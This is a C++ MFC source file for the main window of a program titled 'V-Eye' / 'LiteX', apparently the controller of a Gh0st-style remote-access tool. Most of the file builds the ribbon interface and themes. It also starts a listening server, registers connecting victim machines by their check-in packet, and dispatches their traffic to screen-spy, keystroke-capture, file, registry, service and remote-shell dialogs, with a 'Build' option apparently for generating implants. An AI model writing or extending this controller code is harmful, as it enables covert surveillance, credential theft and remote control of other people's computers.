// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "MainFrm.h"
#include "GroupDlg.h"
#include "InfoDlg.h"
#include "BuildDlg.h"
#include "InputDlg.h"

#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "SystemDlg.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "UrlDlg.h"
#include "ShellDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CIOCPServer *m_iocpServer = NULL;
CMainFrame	*g_pFrame;
extern CGroupDlg	*g_pGroupDlg;
extern CInfoDlg	*g_pInfoDlg;

// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
	ON_WM_CREATE()
	ON_WM_CLOSE()
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
 	ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
 	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
 	ON_MESSAGE(WM_OPENURLDIALOG, OnOpenUrlDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)

	ON_COMMAND(ID_OPTIONS_FRAMETHEME, OnFrameTheme)
	ON_UPDATE_COMMAND_UI(ID_OPTIONS_FRAMETHEME, OnUpdateFrameTheme)

	// 风格
	ON_COMMAND_RANGE(ID_OPTIONS_STYLE_OFFICE2010BLUE, ID_OPTIONS_STYLE_WINDOWS7SCENIC, OnOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_STYLE_OFFICE2010BLUE, ID_OPTIONS_STYLE_WINDOWS7SCENIC,  OnUpdateOptionsStyle)

	// 字体
	ON_COMMAND_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnOptionsFont)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnUpdateOptionsFont)

	ON_COMMAND(ID_MENUITEM_SHOW, &CMainFrame::OnMenuitemShow)
	ON_COMMAND(ID_MENUITEM_HIDE, &CMainFrame::OnMenuitemHide)
	ON_WM_SYSCOMMAND()
	ON_COMMAND(ID_FILE_USER, &CMainFrame::OnFileUser)
	ON_COMMAND(ID_FILE_BUILD, &CMainFrame::OnFileBuild)
	ON_COMMAND(ID_FILE_SETTING, &CMainFrame::OnFileSetting)
	ON_COMMAND(ID_BATCH_LOGOUT, &CMainFrame::OnBatchLogout)
	ON_COMMAND(ID_BATCH_RESTART, &CMainFrame::OnBatchRestart)
	ON_COMMAND(ID_BATCH_SHUT, &CMainFrame::OnBatchShut)
	ON_COMMAND(ID_BATCH_SELECT_ALL, &CMainFrame::OnBatchSelectAll)
	ON_COMMAND(ID_BATCH_UNSELECT, &CMainFrame::OnBatchUnselect)
	ON_COMMAND(ID_LIST_FILE, &CMainFrame::OnListFile)
	ON_COMMAND(ID_LIST_PM, &CMainFrame::OnListPm)
	ON_COMMAND(ID_LIST_SYSTEM, &CMainFrame::OnListSystem)
	ON_COMMAND(ID_LIST_SERVICE, &CMainFrame::OnListService)
	ON_COMMAND(ID_LIST_SYSINFO, &CMainFrame::OnListSysinfo)
	ON_COMMAND(ID_LIST_KEYBOARD, &CMainFrame::OnListKeyboard)
	ON_COMMAND(ID_LIST_REGEDIT, &CMainFrame::OnListRegedit)
	ON_COMMAND(ID_LIST_BATCH, &CMainFrame::OnListBatch)
	ON_WM_TIMER()
	ON_COMMAND(ID_APP_EXIT, &CMainFrame::OnAppExit)
END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTS_PORT,           // IP端口
	ID_STAUTS_TIMEOUT,        // 到期时间
};

// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
	m_nRibbonStyle = ID_OPTIONS_STYLE_OFFICE2016WORD;
}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	// 界面居中显示
	this ->CenterWindow(CWnd::GetDesktopWindow());

	// 设置Ribbon主题
	XTPPaintManager()->SetTheme(xtpThemeRibbon);

	// 创建状态栏
	if (!CreateStatusBar())
		return -1;

	if (!InitCommandBars())
		return -1;

 	CXTPCommandBars* pCommandBars = GetCommandBars();
 	m_wndStatusBar.SetCommandBars(pCommandBars);

 	XTPColorManager()->DisableLunaColors(TRUE);
 	XTPImageManager()->SetMaskColor(RGB(255,255,255));

	//工具栏
    LoadOfficeIcons();

	// 创建Ribbon界面
	if (!CreateRibbonBar())
	{
		TRACE0("Failed to create ribbon\n");
		return -1;
	}

	if (!CreateMessageBar())
		return -1;

	// 创建Pane
	CreateDockingPane();

#ifdef _XTP_INCLUDE_DOCKINGPANE
	SetDockingPaneTheme(xtpPaneThemeOffice2013);
#endif

	CXTPToolTipContext* pToolTipContext = GetCommandBars()->GetToolTipContext();
	pToolTipContext->SetStyle(xtpToolTipResource);
	pToolTipContext->ShowTitleAndDescription();
	pToolTipContext->ShowImage(TRUE, 0, 64);
	pToolTipContext->SetMargin(XTP_DPI_RECT(CRect(2, 2, 2, 2)));
	pToolTipContext->SetMaxTipWidth(180);
	pToolTipContext->SetFont(pCommandBars->GetPaintManager()->GetIconFont());
	pToolTipContext->SetDelayTime(TTDT_INITIAL, 900);
	pToolTipContext->EnableImageDPIScaling(FALSE);

	pCommandBars->GetCommandBarsOptions()->bShowKeyboardTips = TRUE;

	// 设置界面风格
	OnOptionsStyle(ID_OPTIONS_STYLE_OFFICE2016WORD);


	// 创建托盘图标
	if (!m_TrayIcon.Create(_T("LiteX Beat 1.0"), // 提示文本
		this,                                    // 父窗口
		IDR_MAINFRAME,                           // 托盘图标ID
		IDR_MENU_TRAY,                           // 右键菜单ID
		ID_MENUITEM_SHOW,                        // 默认单击事件
		false))                                  // True if default menu item is located by position
	{
		TRACE0(_T("Failed to create tray icon\n"));
		return -1;
	}

	// 加载工具栏和菜单的先前状态
	LoadCommandBars(_T("CommandBars"));

	return 0;
}


void CMainFrame::LoadOfficeIcons()
{
	CXTPCommandBars* pCommandBars = GetCommandBars();
	CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();

	pCommandBars->GetImageManager()->RemoveAll();

 	UINT uicons[] = {ID_APP_EXIT,ID_LIST_SYSINFO,ID_LIST_PM,ID_LIST_BATCH,ID_LIST_REGEDIT,ID_LIST_KEYBOARD,
	ID_FILE_USER,ID_FILE_SETTING,ID_FILE_BUILD,ID_LIST_FILE,ID_LIST_SYSTEM,ID_LIST_SERVICE};
  	pCommandBars->GetImageManager()->SetIcons(IDB_PNG_TOOL, uicons, _countof(uicons), CSize(32, 32));

	UINT nIDs[] = {ID_APP_ABOUT};
	XTPImageManager()->SetIcons(IDB_PNG_ABOUT, nIDs, sizeof(nIDs)/sizeof(UINT), CSize(32, 32), xtpImageNormal);
	XTPImageManager()->SetIcons(IDB_PNG_ABOUT, nIDs, sizeof(nIDs)/sizeof(UINT), CSize(32, 32), xtpImageHot);

}


BOOL CMainFrame::CreateStatusBar()
{
	// 添加状态栏
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0(_T("Failed to create status bar\n"));
		return -1;      // fail to create
	}

	//设置下面状态栏
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
 	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 195);
// 	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);

	return TRUE;
}


BOOL CMainFrame::CreateMessageBar()
{
	if (!m_wndMessageBar.Create(GetCommandBars()))
		return FALSE;


	m_wndMessageBar.AddButton(SC_CLOSE, NULL, _T("关闭消息栏"));
	m_wndMessageBar.SetMessage(_T("Hello World"));

	return TRUE;
}


BOOL CMainFrame::CreateRibbonBar()
{

	CXTPCommandBars* pCommandBars = GetCommandBars();

	CMenu menu;
	menu.Attach(::GetMenu(m_hWnd));
	SetMenu(NULL);

	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)pCommandBars->Add(_T("Ribbon风格"), xtpBarTop, RUNTIME_CLASS(CXTPRibbonBar));
	if (!pRibbonBar)
	{
		return FALSE;
	}

	pRibbonBar->EnableDocking(0);

	CXTPControlPopup* pControlFile = (CXTPControlPopup*)pRibbonBar->AddSystemButton(ID_MENU_FILE);
	pControlFile->SetCommandBar(menu.GetSubMenu(0));

	pControlFile->SetIconId(IDR_MAINFRAME);


	// 四个分页
	CXTPRibbonTab* pTabHome  = pRibbonBar->AddTab(_T("首页"));
	CXTPRibbonTab* pTabFuc   = pRibbonBar->AddTab(_T("桌面管理"));
	CXTPRibbonTab* pTabBuild = pRibbonBar->AddTab(_T("设置"));
	CXTPRibbonTab* pTabAbout = pRibbonBar->AddTab(_T("关于我们"));


	CXTPControl* pControl;

	// 首页分页
	if (pTabHome)
	{
        // 设置
		CXTPRibbonGroup* pGroupSet = pTabHome->AddGroup(ID_TOOL_SET);
		pGroupSet->SetControlsCentering(TRUE);


		pControl = pGroupSet->Add(xtpControlButton, ID_FILE_USER);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupSet->Add(xtpControlButton, ID_FILE_BUILD);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupSet->Add(xtpControlButton, ID_FILE_SETTING);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		//快速开始
		CXTPRibbonGroup* pGroupHome = pTabHome->AddGroup(ID_TOOL_HOME);
		pGroupHome->SetControlsCentering(TRUE);

		CXTPControlPopup* pControlPopup = (CXTPControlPopup*)pGroupHome->Add(xtpControlButtonPopup, ID_LIST_BATCH);
		pControlPopup->SetStyle(xtpButtonIconAndCaptionBelow);

		CMenu menu;
		menu.LoadMenu(IDR_MENU_BATCH);

		CXTPPopupBar* pPopupBar = CXTPPopupBar::CreatePopupBar(GetCommandBars());
		pPopupBar->LoadMenu(menu.GetSubMenu(0));

		pControlPopup->SetCommandBar(pPopupBar);
		pPopupBar->InternalRelease();

		pControl = pGroupHome->Add(xtpControlButton, ID_APP_EXIT);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);
   
        // 显示
		CXTPRibbonGroup* pGroupLink = pTabHome->AddGroup(_T("显示"));
		pGroupLink->SetControlsCentering(TRUE);
// 		pGroupLink->GetControlGroupPopup()->SetIconSize(CSize(48, 48));
// 
// 		CXTPControlHyperlink* pLabel = new CXTPControlHyperlink();
// 		pLabel->SetFlags(xtpFlagManualUpdate);
// 		pGroupLink->Add(pLabel, ID_MENU_FILE);

		pGroupLink->Add(xtpControlCheckBox, ID_VIEW_STATUS_BAR);
		pGroupLink->Add(xtpControlCheckBox, ID_OPTIONS_FRAMETHEME);

		// 筛选
// 		CXTPRibbonGroup* pGroupSearch = pTabHome->AddGroup(_T("筛选客户"));
// 		pGroupSearch->SetControlsCentering(TRUE);
// 		CXTPControlComboBox* pControlCombo = (CXTPControlComboBox*)pGroupSearch->Add(xtpControlComboBox, ID_TOOL_HOME);
// 
// 		pControlCombo->GetCommandBar()->SetCommandBars(pCommandBars);
// 		pControlCombo->ModifyListBoxStyle(0, LBS_OWNERDRAWFIXED | LBS_HASSTRINGS);
// 
// 		pControlCombo->SetWidth(XTP_DPI_X(155));
// 		pControlCombo->SetStyle(xtpButtonIconAndCaption);
// 		pControlCombo->SetDropDownListStyle();
// 		pControlCombo->SetEditText(_T("ComboBox"));
// 		pControlCombo->AddString(_T("Item 1"));
// 		pControlCombo->AddString(_T("Item 2"));
// 
// 		pControlCombo = (CXTPControlComboBox*)pGroupSearch->Add(xtpControlComboBox, ID_TOOL_HOME);
// 
// 		pControlCombo->GetCommandBar()->SetCommandBars(pCommandBars);
// 		pControlCombo->ModifyListBoxStyle(0, LBS_OWNERDRAWFIXED | LBS_HASSTRINGS);
// 
// 		pControlCombo->SetWidth(XTP_DPI_X(155));
// 		pControlCombo->SetStyle(xtpButtonIconAndCaption);
// 
// 		pControlCombo->AddString(_T("ComboBox"));
// 		pControlCombo->AddString(_T("Item 1"));
// 		pControlCombo->AddString(_T("Item 2"));
// 		pControlCombo->SetCurSel(0);
	}

	//桌面管理
	if (pTabFuc)
	{
		//常用工具
		CXTPRibbonGroup* pGroupTool = pTabFuc->AddGroup(ID_TOOL_FUC);
		pGroupTool->SetControlsCentering(TRUE);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_FILE);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_PM);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_SYSTEM);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_REGEDIT);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);


		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_SERVICE);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_KEYBOARD);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupTool->Add(xtpControlButton, ID_LIST_SYSINFO);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);
	}

	//设置
	if(pTabBuild)
	{
		// 设置
		CXTPRibbonGroup* pGroupBuild = pTabBuild->AddGroup(ID_TOOL_SET);
		pGroupBuild->SetControlsCentering(TRUE);
	//	pGroupSet->ShowOptionButton();

		pControl = pGroupBuild->Add(xtpControlButton, ID_FILE_BUILD);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

		pControl = pGroupBuild->Add(xtpControlButton, ID_FILE_SETTING);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

	}

	//关于
	if (pTabAbout)
	{
		// 关于
		CXTPRibbonGroup* pGroupAbout = pTabAbout->AddGroup(ID_TOOL_ABOUT);
		pGroupAbout->SetControlsCentering(TRUE);
		//	pGroupSet->ShowOptionButton();

		pControl = pGroupAbout->Add(xtpControlButton, ID_APP_ABOUT);
		pControl->SetStyle(xtpButtonIconAndCaptionBelow);

	}

	// 选项
	CXTPControlPopup* pControlOptions = (CXTPControlPopup*)pRibbonBar->GetControls()->Add(xtpControlPopup, -1);
	pControlOptions->SetFlags(xtpFlagRightAlign);
	CMenu mnuOptions;
	mnuOptions.LoadMenu(IDR_MENU_OPTIONS);
	pControlOptions->SetCommandBar(mnuOptions.GetSubMenu(0));
	pControlOptions->SetCaption(_T("选项"));


	CXTPControl* pControlAbout = pRibbonBar->GetControls()->Add(xtpControlButton, ID_APP_ABOUT);
	pControlAbout->SetFlags(xtpFlagRightAlign);

	pCommandBars->GetImageManager()->SetIcons(IDR_MAINFRAME);	

	pRibbonBar->ShowQuickAccess(FALSE);
	pRibbonBar->SetCloseable(FALSE);
	pRibbonBar->EnableFrameTheme();

	return TRUE;
}


void CMainFrame::CreateDockingPane()
{
#ifdef _XTP_INCLUDE_DOCKINGPANE
	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeOffice2007Word);
	m_paneManager.SetThemedFloatingFrames(TRUE);
	m_paneManager.SetShowContentsWhileDragging(TRUE);
	m_paneManager.UseSplitterTracker(FALSE);

	CXTPDockingPaneMiniWnd::m_bShowPinButton = FALSE;

	CXTPDockingPane* pwndPane1 = m_paneManager.CreatePane(
		XTP_DPI_X(300), XTP_DPI(CRect(0, 0, 220, 120)), xtpPaneDockLeft);
//	pwndPane1->SetTitle(_T("客户分组"));
	pwndPane1->SetOptions(xtpPaneNoCloseable | xtpPaneHasMenuButton | xtpPaneNoCaption | xtpPaneNoFloatable);

	m_paneGroup.Create(CGroupDlg::IDD, this);
	pwndPane1->Attach(&m_paneGroup);
	m_paneGroup.SetOwnerPane(pwndPane1);
#endif
}


BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CXTPFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));

	// 调整样式，禁用最大化
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	cs.style &= ~FWS_ADDTOTITLE;
	cs.style &= ~WS_MAXIMIZEBOX;//禁止窗口最大化
	cs.style &= ~WS_THICKFRAME; //使窗口不能用鼠标改变大小
	cs.cx = 970;
	cs.cy = 690;
	cs.lpszName = _T("V-Eye终端安全管理软件");// 主窗口标题

	return TRUE;
}


// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

//切换视图
void CMainFrame::SwitchToForm(int nForm)
{
	//CDocument* pDoc = GetActiveDocument();
	CView *pOldActiveView=GetActiveView();             //保存旧视图
	CView *pNewActiveView=(CView*)GetDlgItem(nForm);   //取得新视图
	if(pNewActiveView==NULL)
	{
		switch(nForm)
		{
		case IDD_DLG_INFO :
			pNewActiveView=(CView*)new CInfoDlg;
			break;
		case IDD_DLG_BUILD :
			pNewActiveView=(CView*)new CBuildDlg;
			break;
		}

		CCreateContext context;   //将文挡和视图相连
		context.m_pCurrentDoc=pOldActiveView->GetDocument();
		pNewActiveView->Create(NULL, NULL, WS_BORDER|WS_CHILD ,
			CFrameWnd::rectDefault, this, nForm, &context);


		pNewActiveView->OnInitialUpdate();
	}
	SetActiveView(pNewActiveView);        //改变活动的视图
	pNewActiveView->ShowWindow(SW_SHOW);  //显示新的视图
	pOldActiveView->ShowWindow(SW_HIDE);  //隐藏旧的视图

	if(pOldActiveView->GetRuntimeClass() ==RUNTIME_CLASS(CInfoDlg))
		pOldActiveView->SetDlgCtrlID(IDD_DLG_INFO);

	else if(pOldActiveView->GetRuntimeClass() ==RUNTIME_CLASS(CBuildDlg))
		pOldActiveView->SetDlgCtrlID(IDD_DLG_BUILD);

	pNewActiveView->SetDlgCtrlID(AFX_IDW_PANE_FIRST);

//	delete pOldActiveView;   //删除旧视图  不注释掉的话  当窗口在生成那边的时候 无法读取list信息

	RecalcLayout();          //调整框架窗口
}


// CMainFrame message handlers
void CMainFrame::OnUpdateOptionsStyle(CCmdUI* pCmdUI)
{
	pCmdUI->SetCheck(pCmdUI->m_nID == m_nRibbonStyle ? 1 : 0);

}

void CMainFrame::OnOptionsStyle(UINT nStyle)
{
	m_nRibbonStyle = nStyle;

	GetCommandBars()->SetAllCaps(nStyle == ID_OPTIONS_STYLE_OFFICE2013WORD);
	GetCommandBars()->GetPaintManager()->RefreshMetrics();

	switch (nStyle)
	{
		// Office 2010 blue styles
	case ID_OPTIONS_STYLE_OFFICE2010BLUE:
		SetCommandBarsTheme(xtpThemeRibbon, theApp.m_hModule2010, xtpIniOffice2010Blue);
		break;

		// Office 2010 silver styles
	case ID_OPTIONS_STYLE_OFFICE2010SILVER:
		SetCommandBarsTheme(xtpThemeRibbon, theApp.m_hModule2010, xtpIniOffice2010Silver);
		break;

		// Office 2010 black styles
	case ID_OPTIONS_STYLE_OFFICE2010BLACK:
		SetCommandBarsTheme(xtpThemeRibbon, theApp.m_hModule2010, xtpIniOffice2010Black);
		break;

		// Office 2013 styles
	case ID_OPTIONS_STYLE_OFFICE2013WORD:
		SetCommandBarsTheme(xtpThemeOffice2013, theApp.m_hModule2013, xtpIniOffice2013Word);
		break;

		// Office 2016 styles
	case ID_OPTIONS_STYLE_OFFICE2016WORD:
		SetCommandBarsTheme(xtpThemeOffice2013, theApp.m_hModule2016, xtpIniOffice2016WordColorful);
		break;

		// Windows 7 styles
	case ID_OPTIONS_STYLE_WINDOWS7SCENIC:
		SetCommandBarsTheme(xtpThemeRibbon, theApp.m_hModuleWin7, xtpIniWindows7Blue);
		break;
	}

// 	CXTPRibbonBar *pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetMenuBar();
// 
// 	if ( nStyle >= ID_OPTIONS_STYLE_OFFICE2010BLUE)
// 	{
// 		pRibbonBar->GetSystemButton()->SetStyle(xtpButtonCaption);
// 	}
// 	else
// 	{
// 		pRibbonBar->GetSystemButton()->SetStyle(xtpButtonAutomatic);
// 		CreateSystemMenuPopup();
// 	}

	//LoadIcons();

	// Update tooltip styles.
	CXTPToolTipContext* pToolTipContext = m_wndStatusBar.GetToolTipContext();
	if(NULL != pToolTipContext)
	{
		pToolTipContext->SetStyle(GetToolTipStyle());
	}

	pToolTipContext = GetCommandBars()->GetToolTipContext();
	if(NULL != pToolTipContext)
	{
		pToolTipContext->SetStyle(GetToolTipStyle());
	}

	GetCommandBars()->GetPaintManager()->m_bAutoResizeIcons = TRUE;
	BOOL bDPIIconsScalsing = nStyle != ID_OPTIONS_STYLE_OFFICE2013WORD && nStyle != ID_OPTIONS_STYLE_OFFICE2016WORD;
	GetCommandBars()->GetCommandBarsOptions()->SetDPIScallingOptions(TRUE, bDPIIconsScalsing);

	GetCommandBars()->GetImageManager()->RefreshAll();
	GetCommandBars()->RedrawCommandBars();
	SendMessage(WM_NCPAINT);

	RedrawWindow(0, 0, RDW_ALLCHILDREN|RDW_INVALIDATE);
}

void CMainFrame::SetCommandBarsTheme(XTPPaintTheme paintTheme, HMODULE hModule/*=NULL*/, LPCTSTR lpszINI/*=NULL*/)
{
	if (lpszINI != NULL)
	{
		XTPThemeDLL()->SetHandle(lpszINI);
		XTPPaintManager()->SetTheme(paintTheme);
	}

	CXTPCommandBarsFrameHook::m_bAllowDwm = (XTPSystemVersion()->IsWin10OrGreater() ? FALSE
		: !(CXTPWinDwmWrapper().IsCompositionEnabled()
		&& (xtpThemeOffice2013 == paintTheme)));
}

#ifdef _XTP_INCLUDE_DOCKINGPANE

void CMainFrame::SetDockingPaneTheme(XTPDockingPanePaintTheme nTheme, int nMargin /*=0*/)
{
	m_paneManager.SetTheme(nTheme);
	m_paneManager.SetClientMargin(nMargin);
	m_paneGroup.RefreshMetrics(nTheme);
}

#endif

XTPToolTipStyle CMainFrame::GetToolTipStyle() const
{
	XTPToolTipStyle style;

	switch(m_nRibbonStyle)
	{
		// Office 2010 styles
	case ID_OPTIONS_STYLE_OFFICE2010BLUE:
	case ID_OPTIONS_STYLE_OFFICE2010SILVER:
	case ID_OPTIONS_STYLE_OFFICE2010BLACK:
		style = xtpToolTipOffice;
		break;

	case ID_OPTIONS_STYLE_OFFICE2013WORD:
	case ID_OPTIONS_STYLE_OFFICE2016WORD:
		style = xtpToolTipOffice;	//xtpToolTipOffice2013;
		break;

		// Windows styles
	case ID_OPTIONS_STYLE_WINDOWS7SCENIC:
		style = xtpToolTipLuna;
		break;

	default:
		style = xtpToolTipStandard;
		break;
	}

	return style;
}


int nFonts[] = { 0, 11, 13, 16 };

void CMainFrame::OnOptionsFont(UINT nID)
{
	int nFontHeight = XTP_DPI_Y(nFonts[nID - ID_OPTIONS_FONT_SYSTEM]);

	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	pRibbonBar->SetFontHeight(nFontHeight);

}

void CMainFrame::OnUpdateOptionsFont(CCmdUI* pCmdUI)
{
	int nFontHeight = XTP_DPI_Y(nFonts[pCmdUI->m_nID - ID_OPTIONS_FONT_SYSTEM]);

	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	pCmdUI->SetCheck(pRibbonBar->GetFontHeight() == nFontHeight ? TRUE : FALSE);

}

void CMainFrame::OnFrameTheme()
{
	ShowWindow(SW_NORMAL);
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	CXTPWindowRect rc(this);
	rc.top += (pRibbonBar->IsFrameThemeEnabled() ? -1 : +1) * GetSystemMetrics(SM_CYCAPTION);
	MoveWindow(rc);

	pRibbonBar->EnableFrameTheme(!pRibbonBar->IsFrameThemeEnabled());

}

void CMainFrame::OnUpdateFrameTheme(CCmdUI* pCmdUI)
{
	CXTPRibbonBar* pRibbonBar = (CXTPRibbonBar*)GetCommandBars()->GetAt(0);

	pCmdUI->SetCheck(pRibbonBar->IsFrameThemeEnabled() ? TRUE : FALSE);
}


void CMainFrame::OnClose()
{
	// 保存工具栏和菜单的当前状态
	SaveCommandBars(_T("CommandBars"));

	if (MessageBox(_T("确定退出?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;


	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();

	if (NULL!=m_iocpServer)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}


	CXTPFrameWnd::OnClose();
}


void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip( _T("程序最小化托盘运行中..."), _T("LiteX"), NIIF_NONE, 10);
	}
	else
	{
		CXTPFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnMenuitemShow() 
{
	// TODO: Add your command handler code here
	if (!IsWindowVisible()){
		m_TrayIcon.MaximizeFromTray(this);
	}else
		m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnAppExit()
{
	// TODO: 在此添加命令处理程序代码
	OnClose();
}


// 激活监听服务
void CMainFrame::Activate(UINT nPort)
{
	//判断这个m_iocpServer全局变量是否已经指向了一个CIOCPServer
	if (m_iocpServer != NULL)
	{
		//，如果是的话，就要先关闭它，并且删除掉这个CIOCPServer所占的内存空间
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;

	CString		str;
	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc,this, nPort))
	{
		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
		{ 
			for ( int i=0; ; i++ )
			{ 
				str += CString(inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]));
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				str += _T("/");
			}
		}
		CString temp;
		temp.Format(_T(":%d"),nPort);
		str += temp;
	}
	else
	{
		str.Format(_T("绑定端口:%d 失败,请重新设置监听端口!"), nPort);
	}

	m_wndStatusBar.SetPaneText(0, str);
}

void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
{
	try
	{
		CMainFrame* pFrame = (CMainFrame*) lpParam;

		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}catch(...){}
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
 		case KEYBOARD_DLG:
 			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVICE_DLG:
			((CServiceDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegeditDlg *)dlg)->OnReceiveComplete();
			break;
		case URL_DLG:
			((CUrlDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN: // 上线包
		{
			pContext->m_bIsMainSocket = TRUE;
			g_pFrame->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		}
		break;
	case TOKEN_DRIVE_LIST: // 文件管理 驱动器列表
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO:   // 屏幕查看
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
